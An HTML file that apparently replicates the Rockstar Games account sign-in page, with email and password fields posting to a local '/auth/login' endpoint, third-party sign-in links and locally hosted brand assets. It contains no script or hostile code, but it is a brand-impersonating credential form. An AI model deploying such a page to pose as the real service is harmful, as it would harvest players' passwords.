<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <meta name="referrer" content="origin-when-cross-origin">
    <title>Rockstar Games</title>
    <link rel="shortcut icon" href="src/rockstar.ico">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="app-wrap">
        <div class="app-content">
            <main class="app-main">

                <div class="logo">
                    <span><img src="src/logo_20231030.svg" alt="Rockstar Games Logo"></span>
                </div>

                <div class="login">
                    <!-- Sign in card -->
                    <div class="container">
                        <h1 class="heading">Sign In</h1>

                        <form class="login-form" action="/auth/login" method="POST">
                            <fieldset class="fieldset">
                                <span class="text-input">
                                    <input class="field" type="email" id="email" name="email" placeholder=" "
                                           maxlength="254" autocomplete="email" autofocus>
                                    <label class="label" for="email"><span>Email</span></label>
                                </span>
                            </fieldset>

                            <fieldset class="fieldset">
                                <span class="password-container has-reveal">
                                    <span class="text-input">
                                        <input class="field" type="password" id="password" name="password" placeholder=" "
                                               maxlength="128" autocomplete="current-password">
                                        <label class="label" for="password"><span>Password</span></label>
                                    </span>
                                    <button type="button" class="password-reveal" aria-label="Reveal password">
                                        <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" height="16" width="16">
                                            <path d="M29.8 17.2c-2.2 1.7-4.6 3-7.1 3.7l-2.5-2.5c.6-.8.9-1.8.9-2.9 0-1.4-.5-2.6-1.5-3.6-1.7-1.7-4.5-1.9-6.4-.6l-1.7-1.7c6.3-1.3 12.9.1 18.4 4.3.6.5 1.5.4 1.9-.2.5-.6.4-1.5-.2-1.9-6.7-5.1-14.9-6.6-22.4-4.4L5.7 3.9c-.5-.5-1.4-.5-1.9 0s-.5 1.4 0 1.9l2.6 2.6c-2 .9-4 2-5.8 3.4-.6.5-.7 1.3-.2 1.9.3.3.7.5 1.1.5.3 0 .6-.1.8-.3 1.9-1.5 4-2.6 6.2-3.4l2.9 2.9c-.3.6-.4 1.2-.4 1.8 0 .8.5 1.4 1.3 1.5.6.1 1.2-.4 1.4-1l2.2 2.2c-.2 0-.3 0-.5-.1-.7-.2-1.5.2-1.7.9-.2.7.2 1.5.9 1.7.5.2 1 .2 1.5.2.7 0 1.4-.2 2.1-.5l1.5 1.5c-6 1-12.2-.5-17.3-4.5-.6-.5-1.5-.4-1.9.2-.5.6-.4 1.5.2 1.9 4.6 3.6 10 5.4 15.5 5.4 2 0 3.9-.2 5.9-.7l4.1 4.1c.3.3.6.4 1 .4s.7-.1 1-.4c.5-.5.5-1.4 0-1.9L25.1 23c2.3-.9 4.6-2.1 6.6-3.7.6-.5.7-1.3.2-1.9-.7-.6-1.5-.7-2.1-.2zm-12.2-3.3c.4.4.7 1 .7 1.7 0 .3-.1.6-.2.8l-3-3c.9-.3 1.9-.1 2.5.5z"></path>
                                        </svg>
                                    </button>
                                </span>

                                <div class="keep-signed-in">
                                    <span class="checkbox">
                                        <input type="checkbox" id="keep-signed-in" name="keepMeSignedIn">
                                        <label for="keep-signed-in">Keep me signed in</label>
                                    </span>
                                </div>
                            </fieldset>

                            <fieldset class="fieldset submit-fieldset">
                                <div class="submit-actions">
                                    <p><a class="forgot-link" href="#">Forgot your password?</a></p>
                                    <button type="submit" class="btn btn-primary btn-medium submit-btn">Sign in</button>
                                </div>
                            </fieldset>
                        </form>
                    </div>

                    <!-- Third-party sign in card -->
                    <div class="container">
                        <fieldset class="fieldset third-party-fieldset">
                            <div class="tpa-wrap">
                                <p class="tpa-label">Sign in using</p>
                                <div class="tpa-services">
                                    <a class="tpa-link" href="#" aria-label="Sign in with PlayStation Network">
                                        <img class="tpa-icon" src="src/np.svg" alt="PlayStation Network icon">
                                    </a>
                                    <a class="tpa-link" href="#" aria-label="Sign in with Xbox Live">
                                        <img class="tpa-icon" src="src/xbl.svg" alt="Xbox Live icon">
                                    </a>
                                </div>
                            </div>
                        </fieldset>
                    </div>

                    <!-- Create account -->
                    <div>
                        <p class="create-link">Don't have a Rockstar Games account? <a href="#">Create a new account</a></p>
                    </div>
                </div>

            </main>

            <footer class="app-footer">
                <ul class="footer-list"><li class="footer-item">&copy; 2026 Rockstar Games</li><li class="footer-item"><button type="button" class="footer-policy-btn">Privacy Policy</button></li><li class="footer-item"><button type="button" class="footer-policy-btn">Terms Of Service</button></li><li class="footer-item"><button type="button" class="footer-policy-btn">Cookie Settings</button></li></ul>
            </footer>
        </div>
    </div>
</body>
</html>
